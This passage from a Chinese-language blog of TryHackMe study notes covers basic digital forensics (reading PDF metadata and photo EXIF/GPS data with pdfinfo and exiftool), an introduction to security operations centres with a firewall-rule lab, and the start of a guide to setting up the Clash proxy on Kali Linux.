<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>取证是指应用科学技术来调查犯罪情况和确定事实。随着计算机和智能手机等数字系统的使用和普及，为了调查和数字系统相关的犯罪情况，一个新的取证学分支得以诞生：计算机取证——后来逐渐演变为数字取证。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322232751118.png"
                      alt="image-20230322232751118"
                ></p>
<p>考虑以下场景——执法人员到达了犯罪现场，然而，这个犯罪现场的一部分包括了数字设备和数字媒体；数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等，而数字媒体则包括 CD、DVD、USB 闪存驱动器和外部存储设备。这就引出了以下几个问题：</p>
<ul>
<li>警方应如何收集智能手机和笔记本电脑等设备中的数字证据？ 如果计算机和智能手机正在运行，应遵循哪些工作程序进行处理？</li>
<li>如何传输数字证据？例如，在移动计算机时是否有某些最佳实践方案可以遵循？</li>
<li>如何分析收集到的数字证据？个人设备的数据存储量可能在数十 GB 到数 TB 之间，应该如何进行分析？</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322232730081.png"
                      alt="image-20230322232730081"
                ></p>
<p>假设嫌疑人拥有如上图所示的可疑数字设备和可疑数字媒体，我们可以进行快速查看并调查一些可能存有关键证据的数字设备、媒体；除了台式电脑之外，我们还注意到嫌疑人桌面上有平板电脑、智能手机、数码相机和 USB 闪存驱动器，这些设备及媒体中的任何一个都可能包含有助于案件调查的大量信息，执法者为了将这些设备作为证据进行处理 就需要用到数字取证技术。</p>
<p>更正式地说，数字取证就是应用计算机科学为达到法律目的而对数字证据展开调查。数字取证可用于进行以下两种类型的调查：</p>
<ol>
<li>公共部门调查，是指由政府和执法机构开展的调查，他们将参与犯罪调查或者民事调查。</li>
<li>私营部门调查，是指公司机构通过指派私人调查员进行的调查，无论是内部调查还是外包调查，它们都是由违反公司政策的行为而引发的调查。</li>
</ol>
<p>无论是调查犯罪行为还是调查违反公司政策的行为，部分证据都可能会与数字设备和数字媒体有关，这就是数字取证技术发挥作用并试图确定到底发生了什么的地方，没有训练有素的数字取证调查员的辛勤工作，就不可能正确地处理任何数字证据。</p>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322232853397.png"
                      alt="image-20230322232853397"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320220915406.png"
                      alt="image-20230320220915406"
                ></p>
<h2 id="数字取证流程"><a href="#数字取证流程" class="headerlink" title="数字取证流程"></a>数字取证流程</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322234317128.png"
                      alt="image-20230322234317128"
                ></p>
<p>假如你是一名数字取证调查员，你可能会看到与上图所示场景相类似的现场情况，为了扮演好数字取证调查员的角色，你接下来应该做什么？在获得适当的合法授权后，进行数字取证的基本计划如下：</p>
<ol>
<li><p>获取证据：收集可疑的笔记本电脑、存储设备、数码相机等数字设备。（注意：当笔记本电脑和计算机在打开状态时 需要进行特殊处理，但本文在此不做深入介绍）</p>
</li>
<li><p>建立监管链(Establish a chain of custody)：适当填写相关表格（可基于<a class="link"   href="https://www.nist.gov/document/sample-chain-custody-formdocx" >表格样本 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>），这一步的目的是要确保只有经过授权的调查人员才能访问数字证据，以保证没有其他人可以篡改证据。</p>
</li>
<li><p>将证据放在安全的容器中：你要确保数字证据不被损坏，对于智能手机而言，你需要确保它们无法访问网络，以免被其他人远程擦除数据。</p>
</li>
<li><p>将证据传送到你的数字取证实验室。</p>
</li>
</ol>
<p>在数字取证实验室中，相关的操作过程如下：</p>
<ol>
<li><p>从安全容器中检索数字证据。</p>
</li>
<li><p>创建证据的取证副本：取证副本需要使用高级软件进行创建 以避免修改原始数据。</p>
</li>
<li><p>将数字证据返回到安全容器：之后你将处理取证副本，如果你不小心损坏了取证副本，你可以随时再创建一个新副本。</p>
</li>
<li><p>在取证工作站上处理取证副本。</p>
</li>
</ol>
<p>以上步骤改编自<a class="link"   href="https://www.cengageasia.com/TitleDetails/isbn/9781337568944" >《计算机取证和调查指南》第 6 版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>。</p>
<p>简而言之，进行数字取证时要注意以下几点：</p>
<ul>
<li><p>适当的搜查权限：调查人员不能在没有适当的法律权限的情况下 开始进行数字取证操作。</p>
</li>
<li><p>监管链：这对于随时跟踪谁在持有数字证据是必要的。</p>
</li>
<li><p>数学验证：通过使用一种特殊的数学函数，该函数称为散列（hash-哈希）函数，我们可以确认原数字文件未被修改。</p>
</li>
<li><p>使用经过验证的工具：应对数字取证中使用的工具进行验证，以确保它们能够正常工作；例如，如果你正在创建磁盘映像，你希望能够确保 最终得到的取证映像与磁盘上的原数据相同。</p>
</li>
<li><p>可重复性：只要具备适当的技能和工具，就可以复制数字取证的结果。</p>
</li>
<li><p>报告：数字取证调查以一份报告结束，该报告将显示与所发现案件相关的证据。</p>
</li>
</ul>
<p><strong>答题</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322235500854.png"
                      alt="image-20230322235500854"
                ></p>
<h2 id="数字取证的简单实例"><a href="#数字取证的简单实例" class="headerlink" title="数字取证的简单实例"></a>数字取证的简单实例</h2><p>我们在数字设备上所做的一切，从智能手机到电脑，都会留下痕迹，让我们看看我们如何在后续调查中使用它。</p>
<p>本小节实例场景介绍：我们的猫Gado被绑架了，绑架者向我们发送了一份包含他们要求的 MS Word 文档格式的文档；为了方便起见，我们已将相关文档转换为了 PDF 格式并从 MS Word 文件中提取出了图像；我们接下来要对 目标pdf文件 以及 目标jpg文件 进行简单的数字取证分析。</p>
<p>你可以通过使用TryHackMe中和本文相关的实验房间页面–下载附件到你的本地机器上进行检查；或者直接打开 在对应实验房间页面所部署的 AttackBox 上的终端，然后转到目录 &#x2F;root&#x2F;Rooms&#x2F;introdigitalforensics 进行文件检查。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用TryHackMe所提供的AttackBox上的终端</span></span><br><span class="line"><span class="meta prompt_">root# </span><span class="language-bash"><span class="built_in">cd</span> /root/Rooms</span></span><br><span class="line"><span class="meta prompt_">root# </span><span class="language-bash"><span class="built_in">cd</span> introdigitalforensics</span></span><br><span class="line"><span class="meta prompt_">root# </span><span class="language-bash"><span class="built_in">ls</span></span></span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br></pre></td></tr></table></figure></div>

<p><strong>文档元数据</strong></p>
<p>当你创建简单的文本文件 TXT 时，操作系统会自动保存一些元数据，例如文件创建日期和上次修改日期；而当你使用更高级的编辑器（例如 MS Word）进行文件创建时，会有更多的信息被保留在文件的元数据中。 有多种读取文件元数据的方法，你可以使用一些官方查看器&#x2F;编辑器打开文件读取元数据 或者 选择使用合适的取证工具对文件进行元数据读取，请注意，如果你将原始文件导出为其他格式如 PDF 格式，则将保留原始文档的大部分元数据，这具体取决于你所使用的 PDF 编辑器。</p>
<p> 如果我们要从PDF 文件中获取信息，我们可以尝试使用 <em><strong>pdfinfo</strong></em>工具 来读取pdf文件的元数据。使用 <em><strong>pdfinfo</strong></em> 会显示与 PDF 文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。 （如果你使用的是 Kali Linux 并且没有安装 <em><strong>pdfinfo</strong></em>，则可用 <code>sudo apt install poppler-utils</code> 命令来进行安装）</p>
<p>以下为使用<code>pdfinfo DOCUMENT.pdf</code>命令的示例。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@TryHackMe$ </span><span class="language-bash">pdfinfo DOCUMENT.pdf</span> </span><br><span class="line">Creator:        Microsoft® Word for Office 365</span><br><span class="line">Producer:       Microsoft® Word for Office 365</span><br><span class="line">CreationDate:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">ModDate:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">Tagged:         yes</span><br><span class="line">UserProperties: no</span><br><span class="line">Suspects:       no</span><br><span class="line">Form:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">Pages:          20</span><br><span class="line">Encrypted:      no</span><br><span class="line">Page size:      595.32 x 841.92 pts (A4)</span><br><span class="line">Page rot:       0</span><br><span class="line">File size:      560362 bytes</span><br><span class="line">Optimized:      no</span><br><span class="line">PDF version:    1.7</span><br></pre></td></tr></table></figure></div>

<p>以上 PDF 元数据清楚地表明它是在 2018 年 10 月 10 日使用 MS Word for Office 365 创建的。</p>
<p><strong>答题</strong></p>
<p><em>问题：使用 pdfinfo，找出和本实验房间页面所提供的pdf附件相关的作者信息。(我们使用和本文相关的 TryHackMe实验房间页面 所提供的 AttackBox 进行分析)</em></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /root/Rooms</span><br><span class="line">cd introdigitalforensics</span><br><span class="line">ls</span><br><span class="line">pdfinfo ransom-letter.pdf</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323180941729.png"
                      alt="image-20230323180941729"
                ></p>
<blockquote>
<p>目标pdf文件作者是：Ann Gree Shepherd</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323172932309.png"
                      alt="image-20230323172932309"
                ></p>
<p><strong>照片 EXIF 数据</strong></p>
<p>EXIF 代表 可交换图像文件格式(Exchangeable Image File Format)，它是将元数据保存到图像文件的标准。每当你使用智能手机或数码相机拍照时，图像中都会嵌入大量信息，以下是可以在原始数字图像中找到的元数据示例：</p>
<ul>
<li>相机型号&#x2F;智能手机型号</li>
<li>拍摄图像的日期和时间</li>
<li>照片设置，例如焦距、光圈、快门速度和 ISO 设置等</li>
</ul>
<p>由于智能手机可能配备了 GPS 传感器，因此也很有可能通过照片找到嵌入在图像中的 GPS 坐标(GPS 坐标，即纬度和经度)，这通常会暴露出照片的拍摄地点。</p>
<p>有许多在线和离线工具可以从图像中读取 EXIF 数据，比如命令行工具 <code>exiftool</code> ，<code>exiftool</code> 可用于读取和写入各种文件类型（例如 JPEG 图像）中的元数据。 （如果你使用的攻击机是Kali Linux 并且没有安装 <code>exiftool</code>，则可以输入 <code>sudo apt install libimage-exiftool-perl</code> 命令安装<code>exiftool</code>）</p>
<p>只要执行简单的 <code>exiftool IMAGE</code>命令，就能读取嵌入到图像文件中的所有 EXIF 数据：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">user@TryHackMe$ </span><span class="language-bash">exiftool IMAGE.jpg</span></span><br><span class="line">[...]</span><br><span class="line">GPS Position : 51 deg 31&#x27; 4.00&quot; N, 0 deg 5&#x27; 48.30&quot; W</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></div>

<p>如果我们通过在线地图搜索上述得到的坐标位置，则将了解有关照片拍摄位置的更多信息。我们可以在 <a class="link"   href="https://www.bing.com/maps" >Microsoft Bing 地图 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 或者 <a class="link"   href="https://www.google.com/maps" >谷歌地图 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 上搜索 51° 31’ 4.00” N，0° 5’ 48.30” W ，我们会发现这些坐标将表明 目标照片是在一个非常靠近伦敦博物馆的地方拍摄的（我们用 ° 替换 deg，以便我们使用地图搜索），同时，我们还能注意到 以上坐标在搜索页面上会被转换为十进制表示——51.517776,-0.09675 。</p>
<p><strong>答题</strong></p>
<p><em>问题：使用 exiftool 或任何类似工具，尝试找到 和本实验房间页面所提供的图像附件相关的街道名称。(我们使用和本文相关的 TryHackMe实验房间页面 所提供的 AttackBox 进行分析)</em></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">exiftool letter-image.jpg | grep GPS</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323181841107.png"
                      alt="image-20230323181841107"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323180223367.png"
                      alt="image-20230323180223367"
                ></p>
<blockquote>
<p>从 exiftool 获得的 GPS 坐标是 51 deg 30’ 51.90” N，0 deg 5’ 38.73” W （在使用地图检索时，请用 ° 替换 deg 并在搜索前 删除数字和 ° 符号之间的空格）。</p>
<p>最终我们将使用在线地图搜索以下坐标：51°30’51.9”N 0°05’38.7”W</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323175531086.png"
                      alt="image-20230323175531086"
                ></p>
<p><em>问题：继续分析以上图像附件，拍摄目标照片所用的相机型号名称是什么？(我们使用和本文相关的 TryHackMe实验房间页面 所提供的 AttackBox 进行分析)</em></p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">要仅显示带有单词“Camera”的行，可以使用 exiftool PHOTO.jpg | grep Camera 命令</span></span><br><span class="line">exiftool letter-image.jpg | grep Camera</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323182006160.png"
                      alt="image-20230323182006160"
                ></p>
<blockquote>
<p>拍摄目标照片所用的相机型号名称为：Canon EOS R6</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323175540323.png"
                      alt="image-20230323175540323"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Security Operations(安全运营介绍)-学习</title>
    <url>/2024/01/16/THM-Security%20Operations(%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5%E4%BB%8B%E7%BB%8D)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/securityoperations" >https://tryhackme.com/room/securityoperations <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本文相关内容：了解安全运营中心(SOC)的相关职责、服务和数据来源。</p>
<h2 id="安全运营简介"><a href="#安全运营简介" class="headerlink" title="安全运营简介"></a>安全运营简介</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/47bec18ccc60451eda390ef07b4daf54.png"
                      alt="An image showing a Security Operations Center: a team of IT security professionals tasked with monitoring a company&#39;s network and systems."
                ></p>
<p>安全运营中心 (SOC) 是一类 IT 安全专业人员团队，负责每周 7 天、每天 24 小时监控公司的网络和系统，他们监控的目的是：</p>
<ul>
<li><p>查找网络上的漏洞（Find vulnerabilities on the network）：漏洞可以被攻击者利用，以执行超出许可级别的操作，在网络上的任何设备（操作系统和程序）中都可能发现漏洞，包括服务器设备或计算机设备等；在现实情况中，SOC 可能会发现一组必须针对已发布的特定漏洞进行修补的 MS Windows 计算机。严格来说，查找并发现漏洞不一定是 SOC 的责任范畴，但是，未修复的漏洞肯定会影响整个公司的安全级别。</p>
</li>
<li><p>检测未经授权的活动（Detect unauthorized activity）：例如，攻击者发现了某个员工的用户名和密码并使用这些凭据登录到公司系统——这就是一种未经过授权的活动，而在攻击者造成任何损害之前快速检测到未经授权的活动至关重要；有许多线索可以帮助我们检测到发生了未经授权的活动，例如登录ip所对应的地理位置异常等。</p>
</li>
<li><p>发现策略违规（Discover policy violations）：安全策略是一组规则和程序，旨在保护公司免受安全威胁并确保公司数据的合规性，什么行为被视为违规因公司而异，比如：下载盗版媒体文件、不安全地发送公司机密文件等行为。</p>
</li>
<li><p>检测入侵（Detect intrusions）：入侵是指针对系统和网络进行攻击或窃密的行为，例如攻击者对目标Web 应用程序进行漏洞利用，或者攻击者诱导用户访问恶意站点并感染用户计算机等。</p>
</li>
<li><p>支持事件响应（Support with the incident response）：此处的事件指的是安全事件，事件可以是策略违规、攻击入侵企图或者其他更具破坏性的网络攻击行为，例如发现了某个重大漏洞正在被攻击者利用；正确应对严重安全事件并非易事，而SOC 可以支持事件响应团队更好地处理安全事件。</p>
</li>
</ul>
<p><strong>答题</strong></p>
<blockquote>
<p>SOC代表：Security Operations Center（安全运营中心）</p>
<p>SOC每天监控网络多少小时：24</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320222314909.png"
                      alt="image-20230320222314909"
                ></p>
<h2 id="安全运营的要素"><a href="#安全运营的要素" class="headerlink" title="安全运营的要素"></a>安全运营的要素</h2><p>在本小节中，我们将讨论：</p>
<ul>
<li>SOC 所依赖的示例数据源。</li>
<li>SOC 所提供的服务。</li>
<li>一个示例场景。</li>
</ul>
<p><strong>数据源（Data Sources）</strong></p>
<p>SOC 将通过多种数据源来监控网络环境中是否存在入侵迹象并检测任何恶意行为，其中一些数据来源是：</p>
<ul>
<li>服务器日志：网络上有多种类型的服务器，例如邮件服务器、Web 服务器和 MS Windows 网络上的域控制器等，日志会包含有关各种活动的信息，例如成功和失败的登录尝试等；在服务器日志中，我们可以找到大量和服务器相关的活动信息。</li>
<li>DNS 活动：DNS 代表域名系统，它是负责将域名（例如 tryhackme.com）转换为 IP 地址（例如 10.3.13.37）的协议，同时也支持其他与域名相关的查询；DNS 查询的一个类比是 用户询问“我怎样才能到达 TryHackMe？” 然后就会有人回复一个对应的邮政地址。在实际情况中，如果有人试图浏览 tryhackme.com，DNS 服务器就会对这个域名进行解析，并会将相关的 DNS 查询记录到监控中；SOC 可以仅通过检查 DNS 查询记录来收集有关内部系统尝试与之进行通信的域名的信息。 </li>
<li>防火墙日志：防火墙是一种控制网络数据包进出网络的设备，主要通过放行数据包或者阻断数据包来进行控制流量；因此，防火墙日志可以揭示 有关哪些数据包通过了或者试图通过防火墙的相关大量信息。</li>
<li>DHCP 日志：DHCP 代表的是动态主机配置协议，它主要负责 为尝试连接到某个指定网络的计算机系统分配 IP 地址。DHCP 请求的一个类比是 当你进入一家高级餐厅时，服务员会说欢迎你并引导你到一张空桌子处；使用了DHCP协议后，你无需手动配置即可尝试让你的电脑加入某个网络，因为DHCP 会自动为你的设备提供 加入网络所需的网络设置。通过检查 DHCP 事务，SOC 就可以了解加入到某个指定网络的设备的信息。</li>
</ul>
<p>以上只是一些最常见的数据源，另外还有许多其他资源可用于帮助完善网络安全监控 以及 有利于 SOC 完成其他工作任务；SOC 可能还会使用 安全信息和事件管理系统 (SIEM-Security Information and Event Management) 来开展工作， SIEM 会聚合来自于不同来源的数据信息，以便于 SOC 可以有效地关联数据并响应攻击事件。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/ff0d15f07e9889f26931fa5665a4c871.png"
                      alt="img"
                ></p>
<p><strong>SOC服务（SOC Services）</strong></p>
<p>SOC 服务可分为反应式服务和主动式服务。</p>
<p>反应式服务是指在检测到入侵或恶意事件后启动的任务，包括以下示例：</p>
<ul>
<li>监控安全态势：这是 SOC 的主要职责，它包括监控网络和计算机的相关安全警报、安全通知，并根据需要做出及时响应。</li>
<li>漏洞管理：这是指发现公司系统中的漏洞并修补（修复）它们，SOC 可以协助完成这项任务，但不一定要亲自执行它。</li>
<li>恶意软件分析：SOC 可能需要获取网络中的恶意程序，SOC 可以通过在受控环境中执行恶意程序来进行基本的恶意软件分析，但是，更高级的分析需要由其他专门的安全团队来完成。</li>
<li>入侵检测：入侵检测系统 (IDS) 可用于检测和记录入侵行为和一些可疑数据包，而SOC 的工作就是维护这样一个系统，监控其警报，并根据需要检查其日志。</li>
<li>报告：报告安全事件和警报至关重要，及时进行报告 对于确保工作流程顺畅和支持合规性要求是必要的措施。</li>
</ul>
<p>主动式服务是指在没有任何入侵迹象的情况下由 SOC 处理的任务，需要 SOC 执行的主动服务示例包括：</p>
<ul>
<li><p>网络安全监控（NSM-Network security monitoring）：侧重于监控网络数据和分析流量以检测是否存在入侵迹象。</p>
</li>
<li><p>威胁搜寻：威胁搜寻指的是 SOC 先假定入侵行为已经发生 然后再进行验证，SOC会通过搜寻网络安全威胁 以明确某种入侵行为是否存在。</p>
</li>
<li><p>威胁情报：威胁情报侧重于了解潜在的攻击者及其攻击策略、攻击技术，从而提高公司的防御能力。收集威胁情报的目的是为了建立威胁知情防御。</p>
</li>
</ul>
<p>除了以上服务外，SOC 提供的其他服务还包括网络安全培训，该服务将帮助提高用户的安全意识并为用户提供扎实的安全培训，这可以避免发生过多的数据泄露事件以及网络入侵行为。</p>
<p><strong>示例场景（Example Scenario）</strong></p>
<p>SOC 中有一个角色是 SOC 分析师，SOC 分析师主要负责网络安全监控和日志管理。 </p>
<p>让我们考虑以下场景：在监控网络流量时，SOC 分析师注意到 当前受监控的网络环境中 存在每分钟重复一次的特定 DNS 查询行为，这种行为并不像是用户在正常浏览网络。</p>
<p>SOC 分析师可能的应对流程如下：</p>
<ol>
<li><p>SOC 分析师检查 DNS 查询的来源并将源头确定为网络上的一台笔记本电脑。</p>
</li>
<li><p>SOC 分析师将这台笔记本隔离并检查该机器是否有感染迹象，结果发现该机器上有一个进程（程序）正在使用 DNS 与恶意服务器通信。</p>
</li>
<li><p>SOC 分析师通过查看计算机日志发现该计算机是在访问恶意网站后被感染的，这种感染的结果是：受害计算机通过将消息隐藏在 DNS 查询中来与恶意服务器通信。</p>
</li>
<li><p>SOC 分析师将这台笔记本电脑清理干净，并开始进行威胁搜寻以确保没有其他计算机被感染。</p>
</li>
</ol>
<p><strong>答题</strong></p>
<blockquote>
<p>NSM代表：Network security monitoring（网络安全监控）</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230322231522117.png"
                      alt="image-20230322231522117"
                ></p>
<h2 id="关于SOC的实例"><a href="#关于SOC的实例" class="headerlink" title="关于SOC的实例"></a>关于SOC的实例</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/4d68ffe73a45b4974a36d0947d4b27d8.png"
                      alt="img"
                ></p>
<p>防火墙是一种检查进入和离开网络或系统的网络数据包的设备，我们可以使用防火墙来阻止一些正在进行的网络攻击，最基本的防火墙检查类型包括：</p>
<ul>
<li><p>源 IP 地址和目标 IP 地址：IP 地址是允许你通过 Internet 进行通信的逻辑地址。你可以把 IP 地址类比为邮政地址，例如，一家公司需要使用一个有效的邮政地址来发送和接收包裹，你可以进而将 IP 数据包想象成一个邮递包裹。</p>
</li>
<li><p>源端口号和目标端口号（在适用的情况下）：一台计算机有一个 IP 地址，此外，计算机上的每个程序还需要一个对应的端口号才能通过网络进行通信。你可以把端口号类比为一家公司内的房间号。</p>
</li>
</ul>
<p>基本的防火墙规则可能类似于以下内容：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">源IP地址     目标IP地址    源端口 目标端口  操作</span><br><span class="line"></span><br><span class="line">172.16.4.1  10.10.10.41   ANY    80      PASS（通过）</span><br><span class="line">172.16.8.1  10.10.10.81   ANY    23      DROP（丢弃）</span><br></pre></td></tr></table></figure></div>

<p>以上两条规则规定了以下内容：</p>
<ul>
<li>所有从源 IP 地址 172.16.4.1 到目标 IP 地址 10.10.10.41 并且到目标端口号 80 的 IP 数据包都会被防火墙允许，相关的数据包可以通过防火墙。</li>
<li>所有从源 IP 地址 172.16.8.1 到目标 IP 地址 10.10.10.81 并且到目标端口号 23 的 IP 数据包都会被防火墙阻塞，相关的数据包会被丢弃——无法通过防火墙。</li>
</ul>
<p><strong>答题</strong></p>
<p><em>在本文相关的Tryhackme实验房间页面 部署虚拟实验环境，并完成本小节对应的实例。</em></p>
<p>我们将模拟在防火墙级别拦截恶意IP地址所发出的数据包，这需要我们快速添加一些防火墙规则：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323230516322.png"
                      alt="image-20230323230516322"
                ></p>
<p>发现恶意ip及其数据包：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323230712062.png"
                      alt="image-20230323230712062"
                ></p>
<p>快速添加防火墙规则：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323230832936.png"
                      alt="image-20230323230832936"
                ></p>
<p>成功拦截并得到一个flag：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230323230915180.png"
                      alt="image-20230323230915180"
                ></p>
<blockquote>
<p>最后得到的flag内容为：THM{ATTACK_BLOCKED} 。</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20230320222055186.png"
                      alt="image-20230320222055186"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>网络安全基础</tag>
      </tags>
  </entry>
  <entry>
    <title>在Kali中配置clash代理(含终端流量)</title>
    <url>/2024/01/18/%E5%9C%A8Kali%E4%B8%AD%E9%85%8D%E7%BD%AEclash%E4%BB%A3%E7%90%86(%E5%90%AB%E7%BB%88%E7%AB%AF%E6%B5%81%E9%87%8F)/</url>
    <content><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文内容概述：</p>
<ul>
<li>在Kali中安装clash；</li>
<li>在Kali中配置终端流量代理，以便终端命令在必要的时候可以走代理流量；</li>
<li>在Kali中配置浏览器端流量代理，以便通过kali机器访问谷歌等网站；</li>
<li>解决在使用BurpSuite抓包时遇到的“谷歌recaptcha验证码国内调试”等相关问题。</li>
</ul>
<h2 id="下载Clash"><a href="#下载Clash" class="headerlink" title="下载Clash"></a>下载Clash</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Dreamacro/clash/releases/download/v1.15.1/clash-linux-amd64-v1.15.1.gz</span><br><span class="line"></span><br><span class="line">gunzip clash-linux-amd64-v1.15.1.gz</span><br><span class="line"></span><br><span class="line">mv clash-linux-amd64-v1.15.1 clash#重命名文件夹</span><br><span class="line"></span><br><span class="line">cd clash/</span><br><span class="line"></span><br><span class="line">mv clash-linux-amd64 clash#重命名文件</span><br><span class="line"></span><br><span class="line">chmod +x clash</span><br></pre></td></tr></table></figure></div>

<h2 id="配置clash节点-请自行购买vpn节点"><a href="#配置clash节点-请自行购买vpn节点" class="headerlink" title="配置clash节点(请自行购买vpn节点)"></a>配置clash节点(请自行购买vpn节点)</h2><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">nano /root/.config/clash/config.yaml#将config.yaml配置文件内容更换为已订阅的VPN节点文件内容√</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">可能需要手动复制粘贴节点文件内容</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230745920-1379638961.png"
                      alt="image-20230505071036891"
                ></p>
<h2 id="Kali终端流量代理设置"><a href="#Kali终端流量代理设置" class="headerlink" title="Kali终端流量代理设置"></a>Kali终端流量代理设置</h2><h3 id="修改proxychains4配置文件"><a href="#修改proxychains4配置文件" class="headerlink" title="修改proxychains4配置文件"></a>修改proxychains4配置文件</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nano /etc/proxychains4.conf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在配置文件的末尾部分 添加以下两行</span></span><br><span class="line">http 127.0.0.1 7890       #添加由clash所设置的代理√  端口号7890可通过查看配置文件/root/.config/clash/config.yaml得知</span><br><span class="line">socks5 127.0.0.1 7890     #添加由clash所设置的代理√  端口号7890可通过查看配置文件/root/.config/clash/config.yaml得知</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230746676-1972959411.png"
                      alt="image-20230505071106289"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230747239-1590817637.png"
                      alt="image-20230501215816004"
                ></p>
<h3 id="通过终端启动clash程序"><a href="#通过终端启动clash程序" class="headerlink" title="通过终端启动clash程序"></a>通过终端启动clash程序</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home/hekeats/桌面/clash</span><br><span class="line">./clash</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230747812-1957154928.png"
                      alt="image-20230501215450971"
                ></p>
<p>在浏览器中访问<code>http://clash.razord.top/</code> ，此URL对应的是clash的图形用户界面。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/2857591-20230508230748314-203330223.png"
                      alt="image-20230501215534594"
                ></p>
